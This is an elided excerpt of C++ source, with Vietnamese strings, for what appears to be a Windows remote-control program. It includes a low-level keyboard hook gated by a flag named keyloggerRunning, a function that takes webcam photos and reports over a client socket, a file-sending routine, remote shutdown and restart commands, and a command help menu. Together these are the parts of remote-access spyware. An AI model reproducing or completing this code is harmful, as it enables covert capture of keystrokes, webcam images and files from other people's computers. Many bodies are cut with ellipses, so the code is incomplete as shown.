    ...
    if (nCode == HC_ACTION && keyloggerRunning) {
        ...
        if (isKeyDown) {
            ...
            if (combo.size() == ((modState[VK_LSHIFT] || modState[VK_RSHIFT]) ? 1 : 0) && vk >= 'A' && vk <= 'Z') {
                ...
                else if (specialKeys.count(vk)) keyPart += specialKeys[vk].substr(1, specialKeys[vk].size() - 2); 
                else if (
...
void takeWebcamPhoto(const string& filename = "webcam.bmp") {
    ...
    if (!cap.isOpened()) {
        string msg = "Không tìm thấy webcam\n";
        send(clientSocket, msg.c_str(), msg.size(), 0);
        return;
    }
...
void sendFile(const string& filepath) {
    ...
    ifstream file(pathObj, ios::binary | ios::ate);
    if (!file) return;
    streamsize size = file.tellg();
    file.seekg(0, ios::beg);

    string filename_only = pathObj.filename().u8string();
    ...
    while (remain > 0) {
        file.read(buffer, min(static_cast<streamsize>(sizeof(buffer)), remain));
...
void executeCommand(const string& cmd) {
    if (cmd == "shutdown") system("shutdown /s /t 90");
    else if (cmd == "restart") system("shutdown /r /t 90");
        ...
        string pathUtf8 = cmd.substr(9);
        wstring wPath = utf8_to_wstring(pathUtf8);
        sendFile(wstring_to_utf8(wPath));
    }
        ...
        oss << "                  Các lệnh có sẵn:                         \n"
            ...
            << setw(22) << "restart"            << "- Khởi động lại máy server sau 1p30s\n"
